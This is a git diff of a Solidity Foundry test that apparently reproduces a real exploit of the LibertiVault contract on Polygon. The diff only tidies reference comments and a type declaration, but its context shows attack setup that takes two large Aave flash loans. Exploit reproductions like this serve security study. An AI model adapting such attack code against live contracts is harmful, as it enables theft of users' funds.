@@ -14,10 +14,8 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b#code
 
 // @Analysis
-// Post-mortem : https://www.google.com/
 // Twitter Guy : https://twitter.com/peckshield/status/1678688731908411393
 // Twitter Guy : https://twitter.com/Phalcon_xyz/status/1678694679767031809
-// Hacking God : https://www.google.com/
 
 interface ILibertiVault {
     function deposit(uint256 assets, address receiver, bytes calldata data) external returns (uint256 shares);
@@ -72,7 +70,7 @@ contract ContractTest is Test {
         assets[0] = address(USDT);
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 5_000_000 * 1e6;
-        uint256[] memory modes = new uint[](1);
+        uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
         aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
         aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
